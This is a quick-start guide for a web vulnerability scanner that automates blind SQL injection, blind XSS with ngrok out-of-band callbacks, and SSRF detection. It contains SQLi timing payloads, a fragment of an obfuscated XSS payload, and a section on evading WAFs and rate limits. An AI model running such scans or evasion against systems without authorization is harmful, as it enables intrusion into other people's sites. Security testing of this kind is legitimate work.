# Quick Start Guide

## Installation

```bash
pip install -r requirements.txt
```

Ensure the Burp parameter wordlist remains present at [recon/wordlists/burp_parameter_names.txt](recon/wordlists/burp_parameter_names.txt); recon will fail fast if the file is missing.

**For URL discovery (gau):** Install `gau` (optional but recommended for domain-based recon):
```bash
go install github.com/lc/gau/v2/cmd/gau@latest
```
Without gau, use `-f` to supply a URL file instead of `-u` domain.

## Common Commands

### 1. Blind SQL Injection - Single Domain with Recon

**Discovers URLs via gau, then scans for SQLi**

```bash
python main.py -u example.com --recon --scan sqli --threads 5
```

**What it does:**
- Fetches all URLs from example.com using getallurls (gau)
- Filters URLs with gf patterns (sensitive parameters)
- Scores parameters by risk (id, user, search = high risk)
- Scans each parameter with boolean + time-based + multi-probe techniques
- Outputs findings to `bsqli/output/findings.json` and `.txt`

**Time:** 2-10 minutes depending on target

---

### 2. Blind SQL Injection - Batch from File

**Scans multiple URLs directly without recon**

```bash
python main.py -f targets.txt --scan sqli --threads 10
```

**targets.txt format:**
```
http://example.com/search?q=test
http://vulnerable.com/login?user=admin
http://target.com/api/users?id=1
```

**Tips:**
- `--threads 10` = faster but more aggressive (may trigger WAF)
- `--threads 3` = slower but stealthy (recommended)

**Output:** `bsqli/output/findings.txt`

---

### 3. Blind XSS - Batch with ngrok

**Tests for Blind XSS with out-of-band callbacks**

```bash
# Terminal 1: Start ngrok (if not already running)
ngrok http 5000

# Terminal 2: Run scan with ngrok URL
python main.py -f targets.txt --scan bxss --listener https://abc123.ngrok.io --wait 120 --threads 2
```

**Breakdown:**
- `--listener https://abc123.ngrok.io` - Your callback server URL (from ngrok)
- `--wait 120` - Wait 120 seconds for callbacks (gives time for payloads to execute)
- `--threads 2` - Keep low for BXSS (callbacks are slow)

**What it does:**
1. Injects UUID-tagged XSS payloads into parameters
2. Payloads trigger callbacks to your listener
3. Correlates callbacks with injections (matches UUID)
4. Saves findings to `bxss/output/findings_xss.txt`

**Output:** `bxss/output/callbacks.db` (SQLite with callback details)

---

### 3b. SSRF Capability - Batch with ngrok

**Detect SSRF-capable parameters using controlled OOB callbacks and behavioral inference**

```bash
# Terminal 1: start ngrok if needed
ngrok http 5000

# Terminal 2: run SSRF capability scan
python main.py -f targets.txt --scan ssrf \
  --listener https://abc123.ngrok.io \
  --wait 90
```

**What it does:**
- Confirms blind-capable endpoints via Active Recon (ingestion_vector_scores, async behavior)
- Injects UUID-tagged HTTP(S) SSRF payloads (direct + redirect + unreachable controls)
- Correlates callbacks and behavioral signals, writes report to `ssrf/output/findings.json`

**Output:** `ssrf/output/findings.json` and `findings.txt`

---

### 4. Raw HTTP Request (sqlmap -r style)

**Scan a specific HTTP request for SQLi**

```bash
python main.py --raw request.txt --scan sqli
```

**Scan a POST request for Blind XSS**

```bash
python main.py --raw post_request.txt --scan bxss --listener https://abc123.ngrok.io --wait 120
```

**request.txt format (any HTTP method):**
```
POST /api/search HTTP/1.1
Host: vulnerable.com
Content-Type: application/json

{"query":"test","page":1}
```

**Supports both SQLi and BXSS.** For BXSS, provide `--listener` and `--wait` flags.

---

## Understanding the Output

### SQLi Findings

`bsqli/output/findings.txt`:
```
[+] BOOLEAN on id (http://example.com/search?id=1)
    Confidence: HIGH
    Evidence count: 2
      #1: len_true=5234, len_false=4891, sim=0.92
      #2: len_true=5234, len_false=4892, sim=0.91

[+] TIME on param (http://example.com/page?param=value)
    Confidence: HIGH
    Evidence count: 3
      #1: baseline=0.5s, injected=5.6s
      #2: baseline=0.4s, injected=7.5s
      #3: baseline=0.5s, injected=10.1s
```

**Confidence Levels:**
- `HIGH` - Multiple probes confirm vulnerability
- `MEDIUM` - Detection meets minimum threshold
- `LOW` - Possible false positive

### XSS Findings

`bxss/output/findings_xss.txt`:
```
[+] XSS on text (http://127.0.0.1:5000/search)
    Confidence: N/A (ML not trained)
    Delay: 1.66s
    Payload: < div onmouseover="var a=document.createElement('scr< !-- -- >ipt');...

[ML] Scored 22 findings with anomaly detection
```

**Understanding the output:**

- **Target: text** = parameter name being tested
- **Delay: 0.42s - 1.73s** = callback delay (0.4s+ indicates XSS)
- **ML: N/A** = ML confidence (train model to enable scores)
- **Obfuscated payloads** = intentional filter evasion variants

**Interpreting delays:**
- **< 0.5s** = likely benign
- **0.5-1.5s** = suspicious (possible XSS)
- **> 1.5s** = highly suspicious (confirmed XSS)

---

## Troubleshooting

### "No parameterized URLs found"

**Cause:** Recon didn't find any URLs with parameters

**Solution:**
- Use `-f file.txt` with manually collected URLs instead of `-u` domain
- Ensure target has query parameters (`?param=value`)
- Install `gau` for domain-based recon: `go install github.com/lc/gau/v2/cmd/gau@latest`

### "BXSS scan requires --listener URL"

**Cause:** You forgot to provide callback server URL

**Solution:**
- Start ngrok: `ngrok http 5000`
- Add to command: `--listener https://[ngrok-url]`
- Example: `--listener https://abc123.ngrok-free.app`
- Account setup: https://ngrok.com

### "No callbacks correlated"

**Cause:** Injected payloads aren't triggering or UUID mismatch

**Solution:**
- Check target is vulnerable (test with demo app first)
- Ensure callback server is running (check ngrok dashboard)
- Verify ngrok URL is correct in command
- Payloads have obfuscation variants; delays of 0.4s+ are suspicious even without callbacks

### "Failed to read file"

**Cause:** File doesn't exist or has permission issues

**Solution:**
```bash
# Check file exists
ls targets.txt

# Ensure readable
chmod 644 targets.txt
```
cat targets.txt | head -5
```

### High false positives in SQLi results

**Why:** Time-based detection is sensitive to network latency

**Solution:** Use multi-probe confirmation (automatic)
- System tests SLEEP(3), SLEEP(5), SLEEP(7)
- Verifies delays scale **linearly**
- Detects slow servers with control payload: `IF(1=2, SLEEP(5), 0)`

---

## Advanced Options

### Adjust Thread Count

```bash
# Stealthy (slow, few WAF triggers)
python main.py -u example.com --recon --scan sqli --threads 2

# Aggressive (fast, may trigger WAF)
python main.py -u example.com --recon --scan sqli --threads 20
```

### Longer Callback Wait Time

```bash
# Wait 5 minutes for callbacks (good for slow apps)
python main.py -f targets.txt --scan bxss --listener https://abc123.ngrok.io --wait 300
```

### Multiple Targets from File

```bash
cat > targets.txt << 'EOF'
http://example1.com/search?q=test
http://example2.com/user?id=1
http://example3.com/api/profile?user_id=5
EOF

python main.py -f targets.txt --scan sqli --threads 5
```

---

## Feature Highlights

### False Positive Reduction (SQLi)

- ✅ **Multi-probe confirmation** - Tests SLEEP(3), SLEEP(5), SLEEP(7) with linear verification
- ✅ **Control payload check** - Injects `IF(1=2, SLEEP(5), 0)` to detect slow servers
- ✅ **Baseline jitter analysis** - Measures timing variance, downgrades confidence if unstable
- ✅ **ML + rule hybrid** - Combines IsolationForest anomaly detection with rule-based confirmation

**Result:** 80% fewer false positives vs basic time-based detection

### Production Evasion

- ✅ **Rate limiting** - Per-host throttling with jitter (±20% random delay)
- ✅ **Header rotation** - 11 different User-Agent profiles
- ✅ **Smart deduplication** - Avoids duplicate tests (path+parameter signature)
- ✅ **Parameter scoring** - Prioritizes high-risk params (id, user, search) first

### Callback Server (BXSS)

- ✅ **SQLite persistence** - Survives restarts
- ✅ **Replay protection** - UUID+IP UNIQUE constraint prevents duplicates
- ✅ **Async processing** - Handles 100+ callbacks/second
- ✅ **40+ XSS templates** - CSP bypass, Angular/React, mXSS, etc.

---

## Getting Help

```bash
# Full help with all options
python main.py -h

# View README for architecture
cat README.md

# Check findings format
cat bsqli/output/findings.json | python -m json.tool
```

---

## Example Workflow

```bash
# 1. Discover targets
python main.py -u example.com --recon --scan sqli --threads 5

# 2. Review findings
cat bsqli/output/findings.txt | grep "CONFIDENCE: HIGH"

# 3. Verify manually (recommended for HIGH confidence)
# Use browser DevTools to test payload manually

# 4. Save confirmed vulnerabilities
cp bsqli/output/findings.txt vuln_report_example_com.txt
```

---

**Last Updated:** January 2, 2026
